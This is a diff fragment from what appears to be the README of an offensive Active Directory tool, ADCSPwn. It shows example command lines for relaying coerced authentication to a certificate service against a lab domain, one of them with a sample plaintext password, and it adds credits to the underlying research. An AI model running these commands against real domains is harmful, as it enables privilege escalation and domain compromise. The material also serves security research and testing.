@@ -33,3 +33,8 @@ adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cer
 adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
 adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --dc dc.pwnlab.local --unc \\WIN-WORK01.pwnlab.local\made\up\share
 ```
+
+## Credits
+
+- [@harmj0y](https://twitter.com/harmj0y) & [@tifkin_](https://twitter.com/tifkin_) for their [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) detailing this issue.
+- [@topotam77](https://twitter.com/topotam77) for showing how `EfsRpcOpenFileRaw` can be abused.
